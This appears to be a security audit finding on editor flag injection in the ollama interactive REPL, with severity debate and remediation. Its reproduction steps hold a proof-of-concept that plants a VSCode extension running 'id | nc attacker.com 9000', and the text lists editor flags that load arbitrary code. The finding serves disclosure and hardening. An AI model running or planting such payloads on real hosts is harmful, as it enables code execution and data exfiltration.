Phase: 8
Sequence: 068
Slug: editor-visual-flag-injection-exec
Verdict: VALID
Adversarial-Verdict: CONFIRMED
Adversarial-Rationale: Real-env Go test against the actual editInExternalEditor function showed an attacker-controlled EDITOR env var ("code --extensionDevelopmentPath=/tmp/malicious") reached the spawned binary verbatim as argv[1]; no sanitization exists on the path between os.Getenv and exec.Command.
Severity-Original: HIGH
Severity-Final: MEDIUM
PoC-Status: executed
Pre-FP-Flag: check-5-ambiguous (requires attacker to influence env variables; attacker position ranges from "has shell RC write" to "agent can setenv")
Debate: archon/chamber-workspace/chamber-04/debate.md

## Summary

In interactive mode, the `ollama run` REPL supports a `/edit` subcommand that opens the user's editor on a tmpfile, reads the content back, and sends it as the next message. The editor resolution sequence is:

```go
// cmd/interactive.go:643-649
editor := envconfig.Editor()          // OLLAMA_EDITOR
if editor == "" { editor = os.Getenv("VISUAL") }
if editor == "" { editor = os.Getenv("EDITOR") }
...
// cmd/interactive.go:656
name := strings.Fields(editor)[0]
// cmd/interactive.go:657
_, err := exec.LookPath(name)
...
// cmd/interactive.go:675-677
args := strings.Fields(editor)
args = append(args, tmpFile.Name())
cmd := exec.Command(args[0], args[1:]...)
```

Two problems:

1. **Flag injection**: `strings.Fields("code --extensionDevelopmentPath=/tmp/evil")` yields `["code", "--extensionDevelopmentPath=/tmp/evil"]`; `exec.Command("code", "--extensionDevelopmentPath=/tmp/evil", tmpFile)` runs VSCode with an attacker-installed extension directory. Every major editor (VSCode: `--extensionDevelopmentPath`, `--user-data-dir`, `--extensions-dir`; vim: `+:execute 'source /tmp/evil.vim'`; emacs: `--load /tmp/evil.el`) has at least one flag that loads arbitrary code from a path.

2. **Binary substitution via LookPath**: `exec.LookPath(name)` is satisfied by any binary by that name in `$PATH` — if the attacker can prepend `$PATH` (via `.profile`, via an agent `setenv` call, via a CI runner env), the first `code` / `vim` on PATH runs.

## Location

- `cmd/interactive.go:643-657` — editor resolution and lookpath
- `cmd/interactive.go:675-677` — `strings.Fields` + `exec.Command`
- `envconfig/config.go` — `Editor()` reads `OLLAMA_EDITOR`

## Attacker Control

- Attacker-influenced env vars (`OLLAMA_EDITOR`, `VISUAL`, `EDITOR`, `PATH`). Attainable via:
  - A prior agent tool-call that set env (agent/tool interface)
  - Shell-rc write (e.g., p8-065 chain landed there)
  - CI runner env where a third party controls the environment
  - A hostile Modelfile or launch script that exports the var before exec

## Trust Boundary Crossed

Environment variables from attacker → local process execution surface.

## Impact

Arbitrary code execution on the host when the user invokes `/edit` in the REPL. Common victim flow: user runs `ollama run`, types `/edit`, editor launches, attacker's flag causes the editor to source attacker-controlled config → shell spawns, persistence planted.

Chains with p8-065 (agent RCE primitive that can `setenv EDITOR=...`) to turn a single approved `cat tools/readme.md` into persistent host compromise that survives the ollama session.

## Evidence

Tracer confirmed code on HEAD. `flow-paths-all-severities.md` custom query `exec-with-user-string` reports 8 findings with `os.Getenv('EDITOR','VISUAL','PATH')` as sources and `exec.Command`/`exec.CommandContext` as sinks.

Adversarial reproduction (cold verify): A Go test was added temporarily to the cmd package that calls `editInExternalEditor` directly with EDITOR='code --extensionDevelopmentPath=/tmp/malicious' and a fake `code` on PATH. The fake editor recorded argv and observed the attacker flag as argv[1], confirming the env-to-exec flow with no sanitization. Evidence: `archon/real-env-evidence/editor-flag-injection/reproduction.md`.

Advocate defense brief ("Pattern-6: attacker must already own env") — Synthesizer rejects as overly narrow: agent tools explicitly provide `setenv`-equivalent capabilities, and a single env-write is far less than "full host compromise". The right comparison is to git (`GIT_EDITOR`), sudo (`SUDO_EDITOR`), etc. — many of those have hardening (e.g., sudo strips dangerous env vars from the sudoers' env).

## Reproduction Steps

1. In terminal: `export EDITOR="code --extensionDevelopmentPath=/tmp/evil"; mkdir -p /tmp/evil; cat > /tmp/evil/package.json <<< '{"name":"e","main":"./extension.js","activationEvents":["*"],"contributes":{}}'; cat > /tmp/evil/extension.js <<< 'require("child_process").exec("id | nc attacker.com 9000")'`.
2. `ollama run llama3`.
3. In the REPL: press Ctrl+G (or any prompt mode that invokes the editor; note: original draft said `/edit`, actual trigger is Ctrl+G via readline CharBell/ErrEditPrompt).
4. VSCode launches, loads the extension from the attacker-controlled path, payload executes.

Remediation:
- Parse env strictly with whitespace split but reject tokens starting with `-` that the caller did not supply (i.e., `exec.Command(args[0], tmpFile.Name())` only — drop everything else).
- Better: document a fixed list of trusted editor commands (vim, nvim, nano, emacs, code, subl) and only honor those as editor names without flags.
- Document `OLLAMA_EDITOR` as security-sensitive and ignore `EDITOR`/`VISUAL` unless `OLLAMA_ALLOW_UNSAFE_EDITOR=1`.

## Adversarial Severity Challenge

Started at MEDIUM baseline.
- Not remotely triggerable — requires local env-var write.
- User interaction required (Ctrl+G in interactive REPL).
- Chain-dependent: attacker must already have some foothold (env-write primitive, CI-config access, dotfile write, or agent setenv capability).
- In the common case where an attacker can write ~/.bashrc they already have local shell, making this a lateral/persistence primitive rather than a new privilege boundary.
- In constrained contexts (sandbox with env-write but no direct exec, agentic tool interfaces) this does convert a narrower capability into full user-level RCE.

Net: MEDIUM is the right level. Severity reduced from original HIGH.
